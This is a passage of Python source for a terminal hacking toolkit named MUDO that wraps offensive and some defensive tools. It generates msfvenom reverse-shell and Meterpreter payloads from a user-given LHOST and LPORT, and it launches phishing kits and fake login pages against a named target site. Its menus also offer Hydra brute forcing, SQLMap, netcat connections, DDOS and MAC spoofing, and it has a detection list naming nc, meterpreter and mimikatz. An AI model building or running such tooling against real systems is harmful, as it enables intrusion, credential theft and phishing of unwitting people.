    uname = subprocess.run(["uname", "-a"], capture_output=True, text=True, check=False)
    if uname.stdout:
        print(f"{BLUE}OS:{RESET} {uname.stdout.strip()}")

    cpu = ""
    try:
        with open("/proc/cpuinfo", "r", encoding="utf-8") as cpu_file:
            for line in cpu_file:
                if line.startswith("model name"):
                    cpu = line.split(":", 1)[1].strip()
                    break
    except OSError:
        cpu = "Unknown"
    print(f"{BLUE}CPU:{RESET} {cpu or 'Unknown'}")

    meminfo = {}
    try:
        with open("/proc/meminfo", "r", encoding="utf-8") as mem_file:
            for line in mem_file:
                if ":" in line:
                    key, value = line.split(":", 1)
                    meminfo[key.strip()] = value.strip()
    except OSError:
        meminfo = {}
    if meminfo.get("MemTotal"):
        print(f"{BLUE}Memory:{RESET} {meminfo['MemTotal']}")

    ips = subprocess.run(["hostname", "-I"], capture_output=True, text=True, check=False)
    print(f"{BLUE}IP addresses:{RESET} {ips.stdout.strip() or 'Not available'}")

    wlan = get_wifi_interface()
    print(f"{BLUE}Network interface:{RESET} {wlan}")

    print(f"\n{GREEN}LIVE NETWORK SPEED (sampled over 5 seconds){RESET}")
    prev_rx, prev_tx = read_net_bytes(wlan)
    for _ in range(5):
        time.sleep(1)
        rx, tx = read_net_bytes(wlan)
        delta_rx = max(0, rx - prev_rx)
        delta_tx = max(0, tx - prev_tx)
        speed_mbps = ((delta_rx + delta_tx) * 8) / 1_000_000
        bar_count = min(50, max(0, int(speed_mbps * 8)))
        bar = "█" * bar_count
        print(f"{RED}{wlan}{RESET} {speed_mbps:.2f} Mbps  [{bar:<50}]")
        prev_rx, prev_tx = rx, tx


def check_hibp(email):
    cleaned = email.strip()
    if not cleaned:
        print(f"{RED}No email address provided.{RESET}")
        return

    api_key = os.environ.get("HIBP_API_KEY", "").strip()
    if not api_key:
        print(f"{RED}HIBP requires an API key. Set it in the HIBP_API_KEY environment variable.{RESET}")
        return

    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{urllib.parse.quote(cleaned, safe='@')}"
    request = urllib.request.Request(url, headers={"User-Agent": "MUDO", "hibp-api-key": api_key})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            data = json.loads(response.read().decode("utf-8"))
            if isinstance(data, list) and len(data) > 0:
                print(f"\n{RED}PWNED ALERT:{RESET} {cleaned} appears in {len(data)} breach(es).")
                for breach in data[:5]:
                    print(f"{BLUE}- {breach.get('Name', 'Unknown breach')}: {breach.get('Title', 'No title')}{RESET}")
            else:
                print(f"{GREEN}No breaches found for {cleaned}.{RESET}")
    except urllib.error.HTTPError as exc:
        if exc.code == 401:
            print(f"{RED}HIBP requires a paid API key in the request header. Get one here: https://haveibeenpwned.com/API/Key{RESET}")
        elif exc.code == 404:
            print(f"{GREEN}No breaches found for {cleaned}.{RESET}")
        else:
            print(f"{RED}HIBP request failed: HTTP {exc.code}.{RESET}")
    except Exception as exc:
        print(f"{RED}HIBP request failed: {exc}.{RESET}")


def show_osint_menu():
    while True:
        show_machine_status()
        print(f"\n{GREEN}===================================={RESET}")
        print(f"{GREEN}             OSINT MENU             {RESET}")
        print(f"{GREEN}===================================={RESET}")
        print(f"{BLUE}[1]{RESET} WHOIS Lookup")
        print(f"{BLUE}[2]{RESET} Reverse IP Lookup")
        print(f"{BLUE}[3]{RESET} Domain Reputation Check")
        print(f"{BLUE}[4]{RESET} Social Profile Finder")
        print(f"{BLUE}[5]{RESET} Email OSINT Search")
        print(f"{BLUE}[6]{RESET} Have I Been Pwned")
        print(f"{BLUE}[7]{RESET} Back")
        print(f"{GREEN}===================================={RESET}")

        choice = input("Choose an OSINT tool: ").strip()
        if choice == "1":
            log_tool_usage("WHOIS Lookup")
            domain = input("Enter domain to WHOIS: ").strip()
            if not domain:
                print(f"{RED}No domain provided.{RESET}")
                continue
            if shutil.which("whois"):
                result = subprocess.run(["whois", domain], capture_output=True, text=True, check=False)
                output = (result.stdout or result.stderr or "No WHOIS data returned.").strip()
                print(f"\n{BLUE}WHOIS for {domain}:{RESET}\n{output[:2000]}")
            else:
                print(f"{RED}WHOIS tool is not installed on this machine.{RESET}")
        elif choice == "2":
            run_reverse_ip_lookup()
        elif choice == "3":
            run_domain_reputation_check()
        elif choice == "4":
            run_social_profile_finder()
        elif choice == "5":
            run_email_osint_search()
        elif choice == "6":
            log_tool_usage("Have I Been Pwned")
            email = input("Enter email to check: ").strip()
            check_hibp(email)
        elif choice == "7":
            print(f"{GREEN}Back to hacking menu...{RESET}")
            return
        else:
            print(f"{RED}Invalid OSINT option.{RESET}")


def show_social_engineering_menu():
    while True:
        show_machine_status()
        print(f"\n{GREEN}===================================={RESET}")
        print(f"{GREEN}      SOCIAL ENGINEERING MENU     {RESET}")
        print(f"{GREEN}===================================={RESET}")
        print(f"{BLUE}[1]{RESET} Zphisher")
        print(f"{BLUE}[2]{RESET} Phishing Kit")
        print(f"{BLUE}[3]{RESET} Pretexting Script")
        print(f"{BLUE}[4]{RESET} Fake Login Page")
        print(f"{BLUE}[5]{RESET} USB Drop Strategy")
        print(f"{BLUE}[6]{RESET} Back")
        print(f"{GREEN}===================================={RESET}")

        choice = input("Choose a social engineering tool: ").strip()
        if choice == "1":
            log_tool_usage("Zphisher")
            run_zphisher()
        elif choice == "2":
            log_tool_usage("Phishing Kit")
            if shutil.which("setoolkit"):
                subprocess.run(["setoolkit"], check=False)
            else:
                print(f"{RED}setoolkit is not installed. Install it with: sudo apt install setoolkit{RESET}")
        elif choice == "3":
            log_tool_usage("Pretexting Script")
            show_pretexting_script()
        elif choice == "4":
            log_tool_usage("Fake Login Page")
            site_name = input("Enter target site name: ").strip()
            if shutil.which("setoolkit"):
                print(f"{GREEN}Launching setoolkit for target: {site_name or 'generic site'}{RESET}")
                subprocess.run(["setoolkit"], check=False)
            else:
                print(f"{RED}setoolkit is not installed. Install it with: sudo apt install setoolkit{RESET}")
                print(f"{BLUE}Use a clone workflow or phishing template against {site_name or 'the target site'} after installing it.{RESET}")
        elif choice == "5":
            log_tool_usage("USB Drop Strategy")
            show_usb_drop_guide()
        elif choice == "6":
            print(f"{GREEN}Back to hacking menu...{RESET}")
            return
        else:
            print(f"{RED}Invalid social engineering option.{RESET}")


def run_msfvenom_payload_generator():
    if shutil.which("msfvenom") is None:
        print(f"{RED}msfvenom is not installed. Install it with: sudo apt install metasploit-framework{RESET}")
        return

    print(f"\n{RED}MSFVENOM PAYLOAD GENERATOR{RESET}")
    os_choice = input("Target OS? [1] Windows [2] Linux [3] Android: ").strip()
    os_map = {"1": "windows", "2": "linux", "3": "android"}
    target_os = os_map.get(os_choice)
    if target_os is None:
        print(f"{RED}Invalid OS selection.{RESET}")
        return

    payload_choice = input("Payload type? [1] Reverse Shell [2] Meterpreter [3] Bind Shell: ").strip()
    payload_map = {
        "1": {
            "windows": "windows/shell/reverse_tcp",
            "linux": "linux/x86/shell/reverse_tcp",
            "android": "android/shell/reverse_tcp",
        },
        "2": {
            "windows": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
            "android": "android/meterpreter/reverse_tcp",
        },
        "3": {
            "windows": "windows/shell_bind_tcp",
            "linux": "linux/x86/shell_bind_tcp",
            "android": "android/shell_bind_tcp",
        },
    }
    payload = payload_map.get(payload_choice, {}).get(target_os)
    if payload is None:
        print(f"{RED}Invalid payload type selection.{RESET}")
        return

    lhost = input("LHOST: ").strip()
    if not lhost:
        print(f"{RED}LHOST is required.{RESET}")
        return

    lport = input("LPORT: ").strip()
    if not lport:
        print(f"{RED}LPORT is required.{RESET}")
        return

    format_choice = input("Output format? [1] exe [2] elf [3] apk [4] py: ").strip()
    format_map = {"1": "exe", "2": "elf", "3": "apk", "4": "raw"}
    output_format = format_map.get(format_choice)
    if output_format is None:
        print(f"{RED}Invalid output format selection.{RESET}")
        return

    default_name = {
        "exe": "payload.exe",
        "elf": "payload.elf",
        "apk": "payload.apk",
        "raw": "payload.py",
    }.get(output_format, "payload.bin")
    output_name = input(f"Output file name [{default_name}]: ").strip() or default_name

    command = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", output_format, "-o", output_name]
    print(f"\n{BLUE}Generating payload with command:{RESET}")
    print(f"{GREEN}{' '.join(command)}{RESET}")
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    if result.stdout:
        print(result.stdout)
    if result.stderr:
        print(result.stderr)

    if result.returncode == 0:
        print(f"{GREEN}Payload generated successfully: {output_name}{RESET}")
    else:
        print(f"{RED}Payload generation failed with exit code {result.returncode}.{RESET}")


def run_static_file_analyser():
    file_path = input("Enter file path to analyse: ").strip()
    if not file_path or not os.path.exists(file_path):
        print(f"{RED}File not found or no path provided.{RESET}")
        return

    file_result = subprocess.run(["file", file_path], capture_output=True, text=True, check=False)
    strings_result = subprocess.run(["strings", "-n", "4", file_path], capture_output=True, text=True, check=False)
    md5_result = subprocess.run(["md5sum", file_path], capture_output=True, text=True, check=False)

    print(f"\n{RED}FILE TYPE:{RESET}")
    print(f"{BLUE}{(file_result.stdout or file_result.stderr or 'Unknown file type').strip()}{RESET}")

    md5_text = (md5_result.stdout or md5_result.stderr or "").strip()
    md5_hash = md5_text.split()[0] if md5_text else "Unknown"
    print(f"\n{RED}MD5 HASH:{RESET} {BLUE}{md5_hash}{RESET}")

    strings_lines = [line.strip() for line in (strings_result.stdout or "").splitlines() if line.strip()]
    print(f"\n{RED}READABLE STRINGS (first 30):{RESET}")
    for idx, line in enumerate(strings_lines[:30], start=1):
        print(f"{BLUE}[{idx}] {line}{RESET}")

    if not strings_lines:
        print(f"{RED}No readable strings were found in this file.{RESET}")


def run_virustotal_hash_checker():
    file_path = input("Enter file path to hash: ").strip()
    if not file_path or not os.path.exists(file_path):
        print(f"{RED}File not found or no path provided.{RESET}")
        return

    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as file_handle:
        for chunk in iter(lambda: file_handle.read(65536), b""):
            sha256_hash.update(chunk)

    file_hash = sha256_hash.hexdigest()
    api_key = os.environ.get("VT_API_KEY") or os.environ.get("VIRUSTOTAL_API_KEY") or ""
    if not api_key:
        print(f"{RED}No VirusTotal API key is set. Get a free one from: https://www.virustotal.com/{RESET}")
        return

    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    request = urllib.request.Request(url, headers={"User-Agent": "MUDO-Tool", "x-apikey": api_key})

    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            payload = json.loads(response.read().decode("utf-8"))
            stats = payload.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
            malicious = stats.get("malicious", 0)
            suspicious = stats.get("suspicious", 0)
            total_detections = malicious + suspicious

            print(f"\n{BLUE}SHA256:{RESET} {file_hash}")
            if total_detections > 0:
                print(f"{RED}VirusTotal detected this file as malicious or suspicious.{RESET}")
                analyses = payload.get("data", {}).get("attributes", {}).get("last_analysis_results", {})
                for engine, result in analyses.items():
                    category = result.get("category")
                    if category in ("malicious", "suspicious"):
                        print(f"{RED}- {engine}: {category}{RESET}")
            else:
                print(f"{GREEN}This file appears clean on VirusTotal.{RESET}")
    except urllib.error.HTTPError as exc:
        print(f"{RED}VirusTotal request failed: HTTP {exc.code}.{RESET}")
    except Exception as exc:
        print(f"{RED}VirusTotal request failed: {exc}.{RESET}")


def run_suspicious_process_detector():
    result = subprocess.run(["ps", "aux"], capture_output=True, text=True, check=False)
    network_tool_names = {"nc", "ncat", "netcat"}
    suspicious_markers = ("meterpreter", "empire", "cobaltstrike", "mimikatz")
    matches = []
    for line in (result.stdout or "").splitlines():
        fields = line.split(None, 10)
        if len(fields) < 11:
            continue
        command = fields[10].lower()
        command_names = {os.path.basename(token.strip("'\";,")) for token in command.split()}
        if command_names.intersection(network_tool_names) or any(marker in command for marker in suspicious_markers):
            matches.append(line)

    if not matches:
        print(f"{GREEN}No suspicious processes were detected.{RESET}")
        return

    print(f"\n{RED}WARNING: suspicious processes detected!{RESET}")
    for line in matches:
        print(f"{RED}{line}{RESET}")


def run_string_extractor():
    file_path = input("Enter file path to extract strings from: ").strip()
    if not file_path or not os.path.exists(file_path):
        print(f"{RED}File not found or no path provided.{RESET}")
        return

    result = subprocess.run(["strings", file_path], capture_output=True, text=True, check=False)
    output_text = result.stdout or result.stderr or ""
    print(f"\n{BLUE}Strings extracted from {file_path}:{RESET}")
    print(output_text[:20000])

    save_choice = input("Save the strings output to a file with a timestamp? [y/N]: ").strip().lower()
    if save_choice in ("y", "yes"):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = os.path.join(os.getcwd(), f"strings_{timestamp}.txt")
        with open(output_path, "w", encoding="utf-8") as output_file:
            output_file.write(output_text)
        print(f"{GREEN}Strings saved to: {output_path}{RESET}")


def run_searchsploit_lookup():
    search_term = input("Enter search term for Searchsploit: ").strip()
    if not search_term:
        print(f"{RED}No search term provided.{RESET}")
        return

    if shutil.which("searchsploit") is None:
        print(f"{RED}searchsploit is not installed. Install it with: sudo apt install exploitdb{RESET}")
        return

    result = subprocess.run(["searchsploit", search_term], capture_output=True, text=True, check=False)
    output = result.stdout or result.stderr or "No search results found."
    print(f"\n{BLUE}Searchsploit results for: {search_term}{RESET}")
    print(output[:20000])


MALWARE_NOTES_FILE = os.path.join(os.path.expanduser("~"), ".mudo_malware_notes.txt")


def save_malware_note():
    title = input("Malware note title: ").strip()
    note = input("Write your malware note: ").strip()
    if not title and not note:
        print(f"{RED}Empty malware note not saved.{RESET}")
        return

    entry = f"{title or 'Untitled'}|{note}\n"
    with open(MALWARE_NOTES_FILE, "a", encoding="utf-8") as file_handle:
        file_handle.write(entry)

    print(f"{GREEN}Malware note saved.{RESET}")


def view_malware_notes():
    if not os.path.exists(MALWARE_NOTES_FILE):
        print(f"{RED}No malware notes saved yet.{RESET}")
        return

    with open(MALWARE_NOTES_FILE, "r", encoding="utf-8") as file_handle:
        lines = [line.rstrip("\n") for line in file_handle if line.strip()]

    if not lines:
        print(f"{RED}No malware notes saved yet.{RESET}")
        return

    print(f"\n{RED}=== MALWARE NOTES ==={RESET}")
    for index, line in enumerate(lines, start=1):
        title, note = (line.split("|", 1) + [""])[:2]
        print(f"{BLUE}[{index}] {title}{RESET}")
        print(f"{GREEN}{note}{RESET}")


def show_malware_menu():
    while True:
        show_machine_status()
        print(f"\n{RED}════════ MALWARE ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Msfvenom Payload Generator")
        print(f"{BLUE}[2]{RESET} Static File Analyser")
        print(f"{BLUE}[3]{RESET} VirusTotal Hash Checker")
        print(f"{BLUE}[4]{RESET} Suspicious Process Detector")
        print(f"{BLUE}[5]{RESET} String Extractor")
        print(f"{BLUE}[6]{RESET} Searchsploit")
        print(f"{BLUE}[7]{RESET} Malware Notes")
        print(f"{BLUE}[8]{RESET} Back")
        print(f"{RED}═══════════════════════{RESET}")

        choice = input("Choose a malware option: ").strip()
        if choice == "1":
            log_tool_usage("Msfvenom Payload Generator")
            run_msfvenom_payload_generator()
        elif choice == "2":
            log_tool_usage("Static File Analyser")
            run_static_file_analyser()
        elif choice == "3":
            log_tool_usage("VirusTotal Hash Checker")
            run_virustotal_hash_checker()
        elif choice == "4":
            log_tool_usage("Suspicious Process Detector")
            run_suspicious_process_detector()
        elif choice == "5":
            log_tool_usage("String Extractor")
            run_string_extractor()
        elif choice == "6":
            log_tool_usage("Searchsploit")
            run_searchsploit_lookup()
        elif choice == "7":
            log_tool_usage("Malware Notes")
            while True:
                print(f"\n{RED}=== MALWARE NOTES MENU ==={RESET}")
                print(f"{BLUE}[1]{RESET} Save malware note")
                print(f"{BLUE}[2]{RESET} View malware notes")
                print(f"{BLUE}[3]{RESET} Back")
                sub_choice = input("Choose an option: ").strip()
                if sub_choice == "1":
                    save_malware_note()
                elif sub_choice == "2":
                    view_malware_notes()
                elif sub_choice == "3":
                    break
                else:
                    print(f"{RED}Invalid option.{RESET}")
        elif choice == "8":
            print(f"{GREEN}Back to main menu...{RESET}")
            return
        else:
            print(f"{RED}Invalid malware option.{RESET}")


def show_hacker_news():
    top_stories_url = "https://hacker-news.firebaseio.com/v0/topstories.json"
    try:
        request = urllib.request.Request(top_stories_url, headers={"User-Agent": "MUDO-News/1.0"})
        with urllib.request.urlopen(request, timeout=10) as response:
            story_ids = json.loads(response.read().decode("utf-8"))
        if not isinstance(story_ids, list):
            raise ValueError("Hacker News returned an unexpected story list.")
    except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
        print(f"{RED}Could not fetch Hacker News stories: {exc}{RESET}")
        return

    print(f"\n{RED}TOP HACKER NEWS STORIES{RESET}")
    for rank, story_id in enumerate(story_ids[:5], start=1):
        story_url = f"https://hacker-news.firebaseio.com/v0/item/{story_id}.json"
        try:
            request = urllib.request.Request(story_url, headers={"User-Agent": "MUDO-News/1.0"})
            with urllib.request.urlopen(request, timeout=10) as response:
                story = json.loads(response.read().decode("utf-8"))
            if not isinstance(story, dict):
                raise ValueError("Unexpected story response.")
        except (urllib.error.URLError, TimeoutError, ValueError, json.JSONDecodeError) as exc:
            print(f"{RED}[{rank}] Could not load story {story_id}: {exc}{RESET}")
            continue

        title = story.get("title", "Untitled")
        url = story.get("url", f"https://news.ycombinator.com/item?id={story_id}")
        score = story.get("score", 0)
        print(f"\n{RED}[{rank}] {title}{RESET}")
        print(f"{BLUE}URL: {url}{RESET}")
        print(f"{BLUE}Score: {score}{RESET}")


def show_black_hat_menu():
    global PROXY_STATUS, TOR_STATUS
    show_machine_status()
    print("\n")
    print(" " * 42 + f"{RED}╔{'═' * 28}╗{RESET}")
    print(" " * 42 + f"{RED}║{RESET}" + " " * 6 + f"{BLOOD_RED}BLACK HAT{RESET}" + " " * 7 + f"{RED}║{RESET}")
    print(" " * 42 + f"{RED}╠{'═' * 28}╣{RESET}")
    for _ in range(5):
        print(" " * 42 + f"{BLOOD_RED}│{RESET}" + " " * 28 + f"{BLOOD_RED}│{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[1] Proxy{RESET}                     {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[2] TOR{RESET}                       {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[3] DDOS{RESET}                      {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[4] Leave Network{RESET}            {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[5] MAC Address Spoofing{RESET}    {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[6] F-Society{RESET}                  {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[7] News{RESET}                       {RED}║{RESET}")
    print(" " * 42 + f"{RED}║{RESET}  {BLOOD_RED}[8] Back{RESET}                     {RED}║{RESET}")
    print(" " * 42 + f"{RED}╚{'═' * 28}╝{RESET}")

    while True:
        choice = input(f"{RED}Choose a black hat tool: {RESET}").strip()
        if choice == "1":
            log_tool_usage("Proxy")
            if shutil.which("proxychains") or shutil.which("proxychains4"):
                editor_path = shutil.which("editor") or shutil.which("nano") or shutil.which("vi")
                if editor_path:
                    try:
                        subprocess.run([editor_path, "/etc/proxychains.conf"], check=False)
                        PROXY_STATUS = "ON"
                        print(f"{GREEN}Proxy configuration opened. Proxy status is ON.{RESET}")
                    except OSError as exc:
                        print(f"{RED}Could not open proxy configuration: {exc}{RESET}")
                else:
                    print(f"{RED}No terminal text editor found to open /etc/proxychains.conf.{RESET}")
            else:
                print(f"{RED}proxychains is not installed. Install it with: sudo apt install proxychains4{RESET}")
        elif choice == "2":
            TOR_STATUS = "ON"
            log_tool_usage("TOR")
            print(f"{RED}TOR selected.{RESET} Opening the TOR browser and enabling TOR if available...{RESET}")
            tor_candidates = [
                ["tor-browser"],
                ["tor-browser-en"],
                ["torbrowser"],
                ["start-tor-browser"],
                ["start-tor-browser.desktop"],
                ["torbrowser-launcher"],
            ]
            tor_paths = [
                "/usr/bin/tor-browser",
                "/usr/local/bin/tor-browser",
                "/opt/tor-browser/Browser/start-tor-browser",
                "/opt/tor-browser/start-tor-browser",
                "/usr/lib/tor-browser/start-tor-browser",
                "/usr/share/tor-browser/start-tor-browser",
            ]
            launched = False
            for cmd in tor_candidates:
                if shutil.which(cmd[0]):
                    try:
                        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        launched = True
                        print(f"{GREEN}TOR browser launched via: {' '.join(cmd)}{RESET}")
                        break
                    except Exception as exc:
                        print(f"{RED}Could not launch TOR browser: {exc}{RESET}")
            if not launched:
                for path in tor_paths:
                    if os.path.exists(path):
                        try:
                            subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            launched = True
                            print(f"{GREEN}TOR browser launched from: {path}{RESET}")
                            break
                        except Exception as exc:
                            print(f"{RED}Could not launch TOR browser from {path}: {exc}{RESET}")
            if not launched:
                print(f"{RED}No TOR browser command was found on this system.{RESET}")
                if shutil.which("tor"):
                    try:
                        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        print(f"{GREEN}TOR daemon started.{RESET}")
                    except Exception as exc:
                        print(f"{RED}Could not start TOR daemon: {exc}{RESET}")
                else:
                    print(f"{RED}TOR is not installed on this machine.{RESET}")
        elif choice == "3":
            run_ddos_placeholder()
        elif choice == "4":
            run_leave_network()
        elif choice == "5":
            run_mac_address_spoofing()
        elif choice == "6":
            log_tool_usage("F-Society")
            show_f_society_screen()
        elif choice == "7":
            log_tool_usage("Hacker News")
            show_hacker_news()
        elif choice == "8":
            print(f"{GREEN}Back to hacking menu...{RESET}")
            return
        else:
            print(f"{RED}Invalid black hat option.{RESET}")


def show_web_hacking_menu():
    while True:
        print(f"\n{RED}════════ WEB HACKING ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Gobuster")
        print(f"{BLUE}[2]{RESET} Nikto")
        print(f"{BLUE}[3]{RESET} Netcat")
        print(f"{BLUE}[4]{RESET} SQLMap")
        print(f"{BLUE}[5]{RESET} Back")
        choice = input("Choose a web hacking tool: ").strip()

        if choice == "1":
            run_gobuster()
        elif choice == "2":
            if shutil.which("nikto"):
                target = input("Enter target URL or host: ").strip()
                if target:
                    subprocess.run(["nikto", "-h", target], check=False)
                else:
                    print(f"{RED}No target provided.{RESET}")
            else:
                print(f"{RED}Nikto is not installed on this machine.{RESET}")
        elif choice == "3":
            log_tool_usage("Netcat")
            if shutil.which("nc") or shutil.which("netcat"):
                host = input("Enter host: ").strip()
                port = input("Enter port: ").strip()
                if host and port:
                    command = ["nc", host, port] if shutil.which("nc") else ["netcat", host, port]
                    subprocess.run(command, check=False)
                else:
                    print(f"{RED}No host or port provided.{RESET}")
            else:
                print(f"{RED}Netcat is not installed on this machine.{RESET}")
        elif choice == "4":
            run_sqlmap_scan()
        elif choice == "5":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_network_hacking_menu():
    while True:
        print(f"\n{RED}═══════ NETWORK HACKING ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Packet Sniffing")
        print(f"{BLUE}[2]{RESET} Nmap")
        print(f"{BLUE}[3]{RESET} Hydra")
        print(f"{BLUE}[4]{RESET} ARP Scan")
        print(f"{BLUE}[5]{RESET} Back")
        choice = input("Choose a network hacking tool: ").strip()

        if choice == "1":
            log_tool_usage("Packet Sniffing")
            capture_packets()
        elif choice == "2":
            log_tool_usage("Nmap")
            run_nmap_menu()
        elif choice == "3":
            log_tool_usage("Hydra")
            run_hydra_attack()
        elif choice == "4":
            run_arp_scan()
        elif choice == "5":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_password_attacks_menu():
    while True:
        print(f"\n{RED}════════ PASSWORD ATTACKS ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Hydra")
        print(f"{BLUE}[2]{RESET} John the Ripper")
        print(f"{BLUE}[3]{RESET} Hashcat")
        print(f"{BLUE}[4]{RESET} Hash Identifier")
        print(f"{BLUE}[5]{RESET} Back")
        choice = input("Choose a password attack tool: ").strip()

        if choice == "1":
            log_tool_usage("Hydra")
            run_hydra_attack()
        elif choice == "2":
            if shutil.which("john"):
                wordlist = choose_wordlist() or ""
                if wordlist:
                    hash_file = input("Enter hash file path: ").strip()
                    if hash_file:
                        subprocess.run(["john", "--format=raw-md5", f"--wordlist={wordlist}", hash_file], check=False)
                    else:
                        print(f"{RED}No hash file path provided.{RESET}")
                else:
                    print(f"{RED}No valid wordlist selected.{RESET}")
            else:
                print(f"{RED}John the Ripper is not installed on this machine.{RESET}")
        elif choice == "3":
            if shutil.which("hashcat"):
                print(f"{GREEN}Hashcat is available. Use hashcat --help for options.{RESET}")
            else:
                print(f"{RED}Hashcat is not installed on this machine.{RESET}")
        elif choice == "4":
            if shutil.which("hashid"):
                hash_value = input("Enter hash to identify: ").strip()
                if hash_value:
                    subprocess.run(["hashid", hash_value], check=False)
                else:
                    print(f"{RED}No hash provided.{RESET}")
            else:
                print(f"{RED}Hash Identifier is not installed on this machine.{RESET}")
        elif choice == "5":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_tool_checker():
    tools = [
        ("Nmap", ("nmap",), "sudo apt install nmap"),
        ("SQLMap", ("sqlmap",), "sudo apt install sqlmap"),
        ("ARP Scan", ("arp-scan",), "sudo apt install arp-scan"),
        ("VS Code CLI", ("code",), "Install Visual Studio Code and add 'code' to PATH"),
        ("Gobuster", ("gobuster",), "sudo apt install gobuster"),
        ("DNS utilities", ("dig",), "sudo apt install dnsutils"),
        ("WHOIS", ("whois",), "sudo apt install whois"),
        ("Sherlock", ("sherlock",), "python3 -m pip install sherlock-project"),
        ("theHarvester", ("theHarvester", "theharvester"), "Install theHarvester in a compatible Python environment"),
        ("MAC changer", ("macchanger",), "sudo apt install macchanger"),
        ("IP utility", ("ip",), "sudo apt install iproute2"),
        ("Hydra", ("hydra",), "sudo apt install hydra"),
        ("Packet capture (tshark)", ("tshark",), "sudo apt install tshark"),
        ("Packet capture (tcpdump)", ("tcpdump",), "sudo apt install tcpdump"),
        ("Wireshark GUI", ("wireshark",), "sudo apt install wireshark"),
        ("Timeout", ("timeout",), "sudo apt install coreutils"),
        ("File identification", ("file",), "sudo apt install file"),
        ("Strings", ("strings",), "sudo apt install binutils"),
        ("MD5 sum", ("md5sum",), "sudo apt install coreutils"),
        ("Metasploit (msfvenom)", ("msfvenom",), "sudo apt install metasploit-framework"),
        ("Searchsploit", ("searchsploit",), "sudo apt install exploitdb"),
        ("Proxychains", ("proxychains", "proxychains4"), "sudo apt install proxychains4"),
        ("Tor", ("tor",), "sudo apt install tor"),
        ("Tor Browser launcher", ("tor-browser", "tor-browser-en", "torbrowser", "start-tor-browser", "torbrowser-launcher"), "Install Tor Browser from the official Tor Project site"),
        ("Social-Engineer Toolkit", ("setoolkit",), "sudo apt install setoolkit"),
        ("Netcat", ("nc", "netcat"), "sudo apt install netcat-openbsd"),
        ("John the Ripper", ("john",), "sudo apt install john"),
        ("Hashcat", ("hashcat",), "sudo apt install hashcat"),
        ("Hash identifier", ("hashid",), "sudo apt install hashid"),
        ("Wireless tools (iw)", ("iw",), "sudo apt install iw"),
        ("System hostname", ("hostname",), "sudo apt install hostname"),
        ("Text editor (editor)", ("editor",), "Install a terminal text editor such as nano or vim"),
        ("Text editor (nano)", ("nano",), "sudo apt install nano"),
        ("Text editor (vi)", ("vi",), "sudo apt install vim-tiny"),
    ]

    print(f"\n{RED}TOOL AVAILABILITY CHECK{RESET}")
    for label, commands, install_hint in tools:
        found_path = next((shutil.which(command) for command in commands if shutil.which(command)), None)
        if found_path:
            print(f"{GREEN}[installed] {label}: {found_path}{RESET}")
        else:
            print(f"{RED}[missing] {label} | Install: {install_hint}{RESET}")


def generate_session_report():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_path = os.path.join(os.path.expanduser("~"), f"MUDO_report_{timestamp}.txt")
    sections = [
        ("SESSION LOG", SESSION_LOG_FILE),
        ("NOTES", NOTES_FILE),
    ]

    report_lines = ["MUDO Session Report", f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"]
    for heading, file_path in sections:
        report_lines.extend(("", f"=== {heading} ==="))
        try:
            with open(file_path, "r", encoding="utf-8") as source_file:
                content = source_file.read().strip()
            report_lines.append(content or "No entries.")
        except FileNotFoundError:
            report_lines.append("File not found.")
        except OSError as exc:
            report_lines.append(f"Could not read file: {exc}")

    try:
        with open(report_path, "w", encoding="utf-8") as report_file:
            report_file.write("\n".join(report_lines) + "\n")
    except OSError as exc:
        print(f"{RED}Could not save report: {exc}{RESET}")
        return

    print(f"{GREEN}Report saved to: {report_path}{RESET}")


def check_vpn_status():
    print(f"\n{RED}VPN STATUS CHECK{RESET}")
    request = urllib.request.Request("https://api.ipify.org", headers={"User-Agent": "MUDO/1.0"})
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            public_ip = response.read().decode("utf-8").strip()
        print(f"{BLUE}Public IP: {public_ip}{RESET}")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        print(f"{RED}Could not fetch public IP: {exc}{RESET}")

    result = subprocess.run(["ps", "aux"], capture_output=True, text=True, check=False)
    vpn_markers = ("openvpn", "wireguard", "wg-quick", "tailscale", "mullvad", "protonvpn", "expressvpn", "nordvpn", "anyconnect")
    active_processes = [
        line for line in (result.stdout or "").splitlines()
        if any(marker in line.lower() for marker in vpn_markers)
    ]
    if active_processes:
        print(f"{GREEN}VPN-related process(es) found:{RESET}")
        for process in active_processes:
            print(f"{BLUE}{process}{RESET}")
    else:
        print(f"{RED}No recognized VPN processes found. This check cannot confirm VPN status by itself.{RESET}")


def view_session_log():
